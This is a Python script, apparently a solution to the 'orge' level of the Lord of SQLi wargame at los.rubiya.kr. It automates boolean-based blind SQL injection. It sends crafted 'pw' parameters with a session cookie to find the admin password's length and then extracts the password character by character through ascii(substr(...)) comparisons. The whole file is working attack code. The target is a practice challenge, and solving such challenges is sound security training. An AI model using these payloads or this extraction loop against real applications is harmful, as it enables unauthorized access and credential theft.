import requests, sys
from login import login
from requests.utils import requote_uri
from urllib.parse import quote

auth = login.get_cookie()
cookie = {'PHPSESSID': auth} # Your cookie of los.rubiya.kr

def check_length_passwd():
    i = 0

    while True:
        i += 1
        payload = f"a' || 1=1 && id='admin' && length(pw)={i}#"
        
        # encode anything to url encode, inlcude special symbol like `#`
        enc_payload = quote(payload)
        url = f"https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw={enc_payload}"
        
        # debug url 
        #print (url)
        resp = requests.get(url, cookies=cookie)

        print(f"Trying password length: {i}")
        # debug
        #print(resp.text)
        
        if '<h2>Hello admin</h2>' in resp.text:
            print(f"Length of admin's password is: {i}")
            return i

#check_length_passwd()

def get_pw():
    length = check_length_passwd()
    pos = 1
    print ("Password found: ")
    while (pos <= length):
        for c in range (48,122):
            payload = f"a' || 1=1 && id='admin' && ascii(substr(pw,{pos},1))={c}#"

            enc_payload = quote(payload)
            url = f"https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw={enc_payload}"
            
#            print (f"brute forcing at {pos} position")
            resp = requests.get(url, cookies=cookie)
#                print (resp.text)

            if '<h2>Hello admin</h2>' in resp.text:
#                print(f"Found password is: {c}")
                extr_char = chr(c)
                sys.stdout.write(extr_char)
                sys.stdout.flush()
                pos +=1

   
get_pw()



